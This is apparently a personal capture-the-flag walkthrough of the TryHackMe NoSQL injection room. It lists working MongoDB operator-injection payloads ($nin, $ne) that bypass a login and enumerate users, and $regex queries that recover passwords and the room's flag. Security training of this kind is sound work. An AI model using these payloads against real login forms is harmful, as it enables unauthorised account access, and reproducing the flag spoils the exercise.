### 25-Mar-24-Mon

[TryHackMe | NoSQL injection Basics](https://tryhackme.com/r/room/nosqlinjectiontutorial)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/36585103-29cd-4bca-934e-d0e6e2ac2e10)

http://10.10.195.200/sekr3tPl4ce.php

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/0d56800a-04b3-4b88-b437-a8a9922d7770)

```
User:	admin
Password:	************
Full Name:	
email:	admin@nosql.int
```

```
user[$nin][]=admin&pass[$ne]=test&remember=on
```



```
user[$nin][]=admin&user[$nin][]=test&pass[$ne]=test&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/406c2334-d76a-4378-8ef3-2573f7efbbe5)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d457d48c-aafa-4502-92b4-6d7471cebbd6)

```
User:	pedro
Password:	************
Full Name:	
email:	pcollins@nosql.int
```

```
user=admin&pass[$regex]=^.{7}$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/fb6453d5-cadc-4c23-b093-7da27d070e9e)

```
user=admin&pass[$regex]=^.{8}$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d09d8a15-ec8f-45d4-ab2f-90bb5cee6763)

```
user=admin&pass[$regex]=^a.......$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/4ab7d404-1927-4751-bec3-1e8ffd6f8396)

```
user=admin&pass[$regex]=^admin123$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/054b480e-c99a-452f-9475-3e8ab319e3b4)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/8d78023c-4b02-4b49-bfb1-7f5ba759fd4b)

```
user=john&pass[$regex]=^.{8}$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/3c9c670c-8af2-4c1d-b7de-b68caac23ed6)

https://youtu.be/-gN3ZYOxXak?t=2369

```
user=pedro&pass[$regex]=^coolpass123$&remember=on
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/9e289756-88cb-4855-a99a-42bafc97d144)

```
flag{N0Sql_n01iF3!}
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a9434fdc-652e-4a52-8cf0-ec4e402083c8)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/0d09e5d1-320c-4a72-a0b9-bf7d495029da)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/98ee414f-21e9-407c-8a56-faecaff0b4ac)
